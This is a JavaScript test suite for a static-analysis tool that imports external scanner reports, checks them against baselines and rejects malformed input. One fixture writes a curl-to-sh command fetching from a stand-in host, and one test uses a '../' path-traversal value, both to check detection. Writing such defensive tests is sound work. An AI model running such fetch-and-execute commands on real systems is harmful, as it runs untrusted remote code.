import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { createRequire } from 'node:module';
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import { createHash } from 'node:crypto';
const require = createRequire(import.meta.url);
const { scanStaticDirectory } = require('../../src/main/static-analysis');
let fixture;
let root;
const sha = (value) => createHash('sha256').update(value).digest('hex');
function skillReport(overrides = {}) {
  return {
    skill_path: root,
    findings_count: 1,
    analyzers_used: ['behavioral_analyzer'],
    is_safe: true,
    findings: [
      {
        rule_id: 'PRIVATE_RULE',
        category: 'data_exfiltration',
        severity: 'HIGH',
        file_path: 'run.py',
        line_number: 2,
        analyzer: 'behavioral',
        title: 'PRIVATE_TITLE',
        snippet: 'PRIVATE_TOKEN',
        description: 'PRIVATE_HOST',
      },
    ],
    ...overrides,
  };
}
function artifact(name, value) {
  const filename = path.join(fixture, name);
  fs.writeFileSync(filename, typeof value === 'string' ? value : JSON.stringify(value));
  return filename;
}
async function review(report, options = {}) {
  const { importStaticReport } = require('../../src/main/static-report-import');
  return importStaticReport({
    adapter: 'package',
    directory: root,
    format: 'cisco-skill-json',
    reportFile: artifact('report.json', report),
    ...options,
  });
}
beforeEach(() => {
  fixture = fs.mkdtempSync(path.join(os.tmpdir(), 'aegis-import-'));
  root = path.join(fixture, 'selected package');
  fs.mkdirSync(root);
  fs.writeFileSync(path.join(root, 'run.py'), 'print("PRIVATE_SOURCE")\n');
});
afterEach(() => {
  vi.restoreAllMocks();
  expect(path.dirname(path.resolve(fixture))).toBe(path.resolve(os.tmpdir()));
  fs.rmSync(fixture, { recursive: true, force: true });
});

describe('explicit external static review', () => {
  it.each([
    [1, ['javascript', 'python']],
    [2, ['python']],
    [3, []],
  ])(
    'requires review when a baseline predates language or flow coverage (rule-set %i)',
    async (version, languages) => {
      const before = await scanStaticDirectory('package', root);
      before.ruleSet.version = version;
      for (const key of Object.keys(before.scope))
        if (key.startsWith('codeFlow')) delete before.scope[key];
      for (const key of Object.keys(before.limits))
        if (key.startsWith('flow')) delete before.limits[key];
      for (const language of languages) {
        delete before.scope[language];
        delete before.scope[language + 'ControlFlow'];
        delete before.scope[language + 'Modules'];
        for (const key of Object.keys(before.limits))
          if (key.startsWith(language)) delete before.limits[key];
      }
      const result = await review(skillReport(), { baselineFile: artifact('before.json', before) });
      expect(result.external.issues).toContain('external-baseline-incompatible');
      expect(result.external.findings[0].locations[0].binding).toBe('current-path-only');
      expect(result.reviewRequired).toBe(true);
    },
  );

  it('keeps Cisco claims separate, hashes source IDs and strips free text', async () => {
    const result = await review(skillReport());
    expect(result).toMatchObject({
      mode: 'static-analysis-import',
      safety: 'not-determined',
      reviewRequired: true,
      complete: false,
    });
    expect(result.external.findings[0]).toMatchObject({
      severity: 'high',
      category: 'data_exfiltration',
      confidence: 'external-unverified',
      ruleIdSha256: sha('PRIVATE_RULE'),
      locations: [
        {
          path: 'run.py',
          currentSha256: sha('print("PRIVATE_SOURCE")\n'),
          reportedLine: 2,
          binding: 'current-path-only',
        },
      ],
    });
    expect(result.local.issues).toContainEqual({
      path: 'run.py',
      reason: 'python-call-target-not-resolved',
    });
    expect(JSON.stringify(result)).not.toContain('PRIVATE');
    expect(JSON.stringify(result)).not.toContain(root);
  });

  it('detects a changed file against the caller-selected prior static scan', async () => {
    const baselineFile = artifact('before.json', await scanStaticDirectory('package', root));
    fs.writeFileSync(path.join(root, 'run.py'), 'print("changed")\n');
    const result = await review(skillReport(), { baselineFile });
    expect(result.external.baseline).toMatchObject({ status: 'changed', filesChanged: 1 });
    expect(result.external.findings[0].locations[0].binding).toBe('changed-since-baseline');
  });

  it('retains low findings even when upstream is_safe is true', async () => {
    const document = skillReport();
    document.findings[0].severity = 'LOW';
    const result = await review(document);
    expect(result.status).toBe('findings');
    expect(result.external.findings[0].severity).toBe('low');
    expect(result.reviewRequired).toBe(true);
  });

  it('compares matching observed bytes without claiming the external scanner used them', async () => {
    const baselineFile = artifact('before.json', await scanStaticDirectory('package', root));
    const result = await review(skillReport(), { baselineFile });
    expect(result.external.baseline).toMatchObject({
      status: 'matching-observed-files',
      filesMatched: 1,
      baselineComplete: false,
    });
    expect(result.external.findings[0].locations[0].binding).toBe('matched-baseline-file');
    expect(result.external.source).toMatchObject({
      authenticity: 'unverified',
      execution: 'not-observed',
    });
    expect(result.complete).toBe(false);
  });

  it('counts missing observations without claiming file deletion, and notices additions', async () => {
    const baselineFile = artifact('before.json', await scanStaticDirectory('package', root));
    fs.unlinkSync(path.join(root, 'run.py'));
    fs.writeFileSync(path.join(root, 'added.py'), 'print(1)');
    const result = await review(skillReport(), { baselineFile });
    expect(result.external.baseline).toMatchObject({
      filesUnobserved: 1,
      filesAdded: 1,
      status: 'changed',
    });
    expect(result.external.findings[0].locations[0].binding).toBe('unbound');
    expect(JSON.stringify(result)).not.toContain('deleted');
  });

  it.each(['root', 'adapter', 'scope', 'limits'])(
    'does not compare an incompatible baseline %s',
    async (kind) => {
      const before = await scanStaticDirectory('package', root);
      if (kind === 'root') before.subjectSha256 = 'f'.repeat(64);
      if (kind === 'adapter') before.adapter.id = 'project';
      if (kind === 'scope') before.scope.files = 'PRIVATE_SCOPE';
      if (kind === 'limits') before.limits.depth = 3;
      const result = await review(skillReport(), { baselineFile: artifact('before.json', before) });
      expect(result.external.baseline.status).toBe('incompatible');
      expect(result.external.findings[0].locations[0].binding).toBe('current-path-only');
      expect(result.external.issues).toContain('external-baseline-incompatible');
      expect(JSON.stringify(result)).not.toContain('PRIVATE');
    },
  );

  it.each(['duplicate', 'path-null', 'path-traversal', 'hash', 'version', 'array-limit'])(
    'rejects malformed baseline %s',
    async (kind) => {
      const before = await scanStaticDirectory('package', root);
      if (kind === 'duplicate') before.files.push(before.files[0]);
      if (kind === 'path-null') before.files[0].path = null;
      if (kind === 'path-traversal') before.files[0].path = '../PRIVATE_PATH';
      if (kind === 'hash') before.files[0].sha256 = 'PRIVATE_HASH';
      if (kind === 'version') before.schemaVersion = 99;
      if (kind === 'array-limit') before.files = Array(1025).fill(before.files[0]);
      await expect(
        review(skillReport(), { baselineFile: artifact('before.json', before) }),
      ).rejects.toThrow('external-baseline-invalid');
    },
  );

  it('never reads a report-supplied path outside the selected tree', async () => {
    const outside = artifact('PRIVATE_SECRETS', 'PRIVATE_TOKEN');
    const document = skillReport();
    document.findings[0].file_path = outside;
    const open = vi.spyOn(fs.promises, 'open');
    const result = await review(document);
    expect(open.mock.calls.some(([name]) => name === outside)).toBe(false);
    expect(result.external.findings[0].locations[0].path).toBeNull();
    expect(JSON.stringify(result)).not.toContain('PRIVATE');
  });

  it('binds provenance to the exact imported bytes', async () => {
    const document = JSON.stringify(skillReport(), null, 2) + '\n';
    const result = await review(document);
    expect(result.external.source.sha256).toBe(sha(document));
  });

  it('keeps local findings when an external report claims there are none', async () => {
    fs.writeFileSync(path.join(root, 'install.sh'), 'curl https://example.invalid/install | sh');
    const result = await review(skillReport({ findings_count: 0, findings: [] }));
    expect(result.local.findings[0].ruleId).toBe('STA001');
    expect(result.external.findings).toHaveLength(0);
    expect(result.status).toBe('findings');
    expect(result.reviewRequired).toBe(true);
  });
});
